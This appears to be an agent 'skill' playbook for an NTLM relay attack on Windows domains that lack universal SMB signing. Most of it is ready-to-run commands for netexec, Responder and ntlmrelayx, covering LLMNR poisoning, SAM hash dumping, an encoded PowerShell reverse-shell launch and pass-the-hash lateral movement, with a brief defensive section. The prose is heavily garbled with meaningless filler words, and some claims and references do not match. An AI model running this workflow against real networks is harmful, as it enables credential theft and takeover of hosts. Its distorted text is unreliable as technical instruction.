---
name: ntlm-relay-smb-signing-bypass
description: >
  Execute advanced Man-in-the-Middle (MITM) NTLM Relay attacks specifically targeting environments 
  where SMB Signing is purportedly enabled but improperly configured (e.g., exclusively required 
  on Domain Controllers but NOT enforced universally on standard Workstations or File Servers). 
  Utilize powerful tools like Responder and Impacket's NTLMRelayX to coercively capture NTLMv2 
  authentications (via LLMNR, WPAD, or Coercion methods like PetitPotam) and seamlessly relay 
  them across the network identically yielding immediate Local Administrator command execution.
domain: cybersecurity
subdomain: penetration-testing
category: Network Security
difficulty: expert
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0006, TA0008, TA0004]
  techniques: [T1557.001, T1187, T1201]
platforms: [windows, linux]
tags: [ntlm-relay, network-pentesting, active-directory, responder, impacket, smb-signing, lateral-movement]
tools: [responder, impacket-ntlmrelayx, crackmapexec, netexec]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# NTLM Relay & SMB Signing Bypass Architecture

## When to Use
- When conducting an internal Active Directory network assessment systematically discovering uniquely that while Domain Controllers demand aggressive cryptographic 'SMB Signing', standard user workstations (`Windows 10`) and tertiary file servers (`Windows Server 2019`) seamlessly possess `SMB Signing Enabled: True` intrinsically but natively feature `SMB Signing Required: False`.
- Rather than merely capturing an authentication hash intrinsically attempting to computationally crack it using Hashcat implicitly (which fails instantly against complex 15-character passwords), systematically relay the identical captured session cryptographically to a secondary target natively achieving comprehensive Remote Code Execution (RCE) instantly without cracking entirely.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Validating the SMB Signing Vulnerability (The Pre-Requisite)

```bash
# Concept: NTLM Relaying fundamentally fails against ANY target identically demanding 
# `Message Authentication Codes (MAC)` explicitly validating the exact sender inherently 
# (SMB Signing Required). By absolute Microsoft default flawlessly, Domain Controllers REQUIRE 
# signing fundamentally. Workstations identically DO NOT. We must map the exact un-signed targets.

# 1. Utilize Netexec (or CrackMapExec) systematically scanning the entire Class C /24 subnet natively.
nxc smb 10.0.0.0/24 --gen-relay-list targets.txt

# 2. Analyze the Output unequivocally:
# [SMB] 10.0.0.5     (DC-01)   [+] SMB Signing is TRUE. Required is TRUE. (IMMUNE TO RELAY!)
# [SMB] 10.0.0.12    (FILESV)  [+] SMB Signing is TRUE. Required is FALSE. (VULNERABLE TARGET!)
# [SMB] 10.0.0.55    (WIN10)   [+] SMB Signing is TRUE. Required is FALSE. (VULNERABLE TARGET!)

# 3. The `targets.txt` unequivocally compiles an exhaustive list exclusively isolating 
# targets vulnerable implicitly.
```

### Phase 2: Generating Coerced Authentication (The Capture)

```bash
# Concept: An attacker fundamentally requires a highly-privileged victim (e.g., a Domain Admin 
# or Helpdesk Administrator explicitly) to attempt authenticating entirely to the Kali Linux 
# attacking machine natively. We seamlessly achieve this utilizing LLMNR Poisoning implicitly.

# 1. Disable explicit SMB/HTTP modules dynamically within `Responder.conf` identically preventing 
# Responder from simply capturing the hash natively. We uniquely want NTLMRelayX handling the cryptography seamlessly.

# 2. Launch Responder aggressively poisoning identically anomalous broadcast name resolution requests (LLMNR/mDNS) implicitly.
sudo responder -I eth0 -rwdPv

# Scenario:
# The `Helpdesk_Admin` explicitly typos a file share uniquely targeting `\\fileserrrver\projects`.
# DNS seamlessly fails identically. LLMNR uniformly broadcasts across the subnet inherently 
# asking "Who intrinsically has the IP for Fileserrrver?". 
# Responder aggressively screams "I unequivocally possess that exact IP unequivocally! Connect to me natively!"
```

### Phase 3: Executing the Synchronized NTLM Relay Attack (The Pwn)

```bash
# Concept: Responder seamlessly intercepts the authenticating victim explicitly. NTLMRelayX 
# unequivocally accepts the incoming authentication natively and instantaneously fires it 
# systematically at our precise vulnerable target explicitly extracted in Phase 1 seamlessly.

# 1. Start NTLMRelayX aggressively utilizing the explicit target list generating 
# comprehensive SAM hash dumps inherently executing sudo impacket-ntlmrelayx -tf targets.txt -smb2support

# 2. The Relay Execution Lifecycle (Automated securely):
# - Administrator's machine attempts SMB SSO intrinsically to the Attacker (Responder IP).
# - NTLMRelayX intercepts inherently forwarding precisely that exact identical session transparently against `10.0.0.12` (Fileserver).
# - The Fileserver inherently validates the credentials cryptographically against the Domain Controller seamlessly.
# - The Fileserver unequivocally issues an Access Granted ticket explicitly to NTLMRelayX inherently!
```

### Phase 4: Escalation Outputs

```bash
# Concept: By default unequivocally, NTLMRelayX intrinsically leverages the authenticated session natively 
# executing a remote registry dump implicitly exfiltrating the local SAM database securely.

# Typical Automated Output intelligently:
# [*] Authenticating against smb://10.0.0.12 as DOMAIN\Helpdesk_Admin SUCCEED
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b...:f0d4...
# User:1001:aad3b...:1a2b...

# Advanced Interactive Command Execution identically:
# Instead of dumping hashes natively, command NTLMRelayX specifically integrating a Cobalt Strike 
# Reverse Shell inherently bypassing basic execution policies uniquely.
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc JABB... "
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Scan Subnet utilizing `nxc smb` generating comprehensive `targets.txt`] --> B[Disable SMB/HTTP parsing inherently inside `Responder.conf`]
    B --> C[Launch `impacket-ntlmrelayx` uniquely specifying the `-tf targets.txt`]
    C --> D[Launch `Responder -I eth0` aggressively poisoning broadcasts]
    D --> E[Wait for highly-privileged Victim (e.g., DA/Local Admin) uniformly triggering LLMNR via mistyping explicitly]
    E --> F{NTLMRelayX intercepts Auth dynamically}
    F -->|Victim possesses Local Admin rights inherently on Target PC| G[NTLMRelayX seamlessly extracts Local SAM Hashes generating comprehensive compromised artifacts explicitly]
    F -->|Victim lacks rights inherently on Target PC| H[Authentication succeeds organically but NTLMRelayX fails intrinsically dumping the SAM inherently. Access Denied unequivocally.]
    G --> I[Use explicit Pass-The-Hash dynamically utilizing the extracted uniquely local `Administrator` NTLM hash fundamentally achieving Lateral Movement broadly]
```

## 🔵 Blue Team Detection & Defense
- **Enforce SMB Signing Universally**: The ultimate defense crushing this vulnerability fundamentally relies on mandating SMB Signing systematically. Implement absolute Group Policy Objects (GPOs) commanding `Microsoft network server: Digitally sign communications (always)` specifically transitioning the variable to `TRUE` universally encompassing all standard workstation fleets intuitively, not just explicit Domain Controllers natively. The computational CPU overhead is profoundly negligible on modern hardware inherently.
- **Disable Legacy Protocols (LLMNR / NBT-NS)**: Entirely prevent attackers natively from establishing a Man-In-The-Middle position securely by comprehensively disabling Link-Local Multicast Name Resolution identically across the entire Domain logically. If DNS fails forbid endpoints natively from unilaterally screaming blindly over explicitly unencrypted UDP multicasts inherently asking unverified neighbors unequivocally for IP routing instructions intuitively.
- **Implement Tiered Administrative Boundaries**: The NTLM relay fundamentally requires a high-level `Administrator` inherently communicating across a low-level segment fundamentally. Implement restrictive Tiering models globally enforcing entirely that highly-privileged `Tier-0` accounts absolutely NEVER explicitly log into or unequivocally authenticate natively against vulnerable `Tier-2` standard user workstations organically.

## Key Concepts
| Concept | Description |
|---------|-------------|
| NTLMv2 Authentication | A severe challenge-response protocol exclusively functioning inherently by hashing a mathematical challenge fundamentally preventing cleartext interception natively but severely susceptible exactly to Relay attacks dynamically |
| SMB Signing | An absolute cryptographic infrastructure signing identically every single SMB packet fundamentally enforcing identity flawlessly and explicitly destroying Relay spoofing attempts seamlessly |
| Coercion | The adversarial act of explicitly utilizing vulnerable APIs unconditionally (e.g., PetitPotam / MS-EFSRPC) actively forcing implicitly a highly-privileged Domain Controller comprehensively to unilaterally authenticate completely against the attacker exclusively |
| Local Administrator Rights | To remotely dump SAM databases aggressively utilizing NTLMRelayX identically the victim authenticated securely MUST possess explicit Local Administrator designation over the fundamentally targeted remote machine unequivocally |

## Output Format
```
Internal Lateral Movement Execution: Synchronized NTLM Relaying
===============================================================
Target Infrastructure: `10.200.1.0/24` Client Subnet
Vulnerability: SMB Signing Not Required (Default Settings)
Severity: Critical (CVSS 9.4)

Description:
A systematic internal network evaluation fundamentally identified identically that while Domain Controllers cryptographically possessed required SMB Signing explicitly, 142 distinct Windows 11 end-user endpoints natively lacked the enforcement implicitly, classifying them thoroughly vulnerable.

The Red Team entirely established a comprehensive MITM presence dynamically utilizing Responder actively executing standard LLMNR protocol poisoning cleanly. 

At 14:15 UTC the `Domain\ITSupport_Helpdesk` administrative account requested resolution entirely for an invalid file share intuitively. Responder captured the broadcast natively intercepting the unencrypted inbound NTLMv2 session seamlessly.

NTLMRelayX captured the live authentication stream uniquely and categorically redirected it precisely at `10.200.1.88` (a comprehensively vulnerable Workstation dynamically).

Impact:
Because the `ITSupport_Helpdesk` account explicitly retained uniform `Local Administrator` rights unequivocally across all workstations instinctively, the Target identically verified the relay trusting it absolutely.

NTLMRelayX explicitly established execution context dumping exactly the intrinsic `Administrator` absolute LM:NTLM hash cleanly via the Remote Registry protocol effortlessly. Broad Lateral Movement capabilities achieved bypassing multi-factor identity unconditionally.
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- SecureAuth Impacket: [NTLMRelayX Tooling](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
- TrustedSec: [A Guide to NTLM Relaying](https://trustedsec.com/blog/a-guide-to-ntlm-relaying)
- Microsoft Documentation: [Overview of SMB Signing](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level)
